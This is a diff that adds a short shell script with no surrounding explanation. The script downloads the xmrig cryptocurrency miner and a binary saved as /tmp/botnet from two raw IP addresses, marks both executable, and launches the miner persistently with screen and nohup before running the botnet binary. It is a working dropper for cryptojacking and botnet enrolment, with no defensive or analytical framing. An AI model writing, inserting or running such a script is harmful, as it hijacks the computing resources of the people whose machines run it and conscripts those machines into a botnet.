@@ -1,0 +1,10 @@
+wget http://193.233.132.31/xmrig -O /tmp/xmrig
+wget http://91.92.245.34/biggiboggi.ssla -o /tmp/botnet
+chmod 777 /tmp/xmrig
+chmod +x /tmp/xmrig
+chmod 777 /tmp/botnet
+chmod +x /tmp/botnet
+screen /tmp/xmrig -o localhost:25577
+nohup /tmp/xmrig -o localhost:25577 &
+/tmp/xmrig -o localhost:25577
+/tmp/botnet
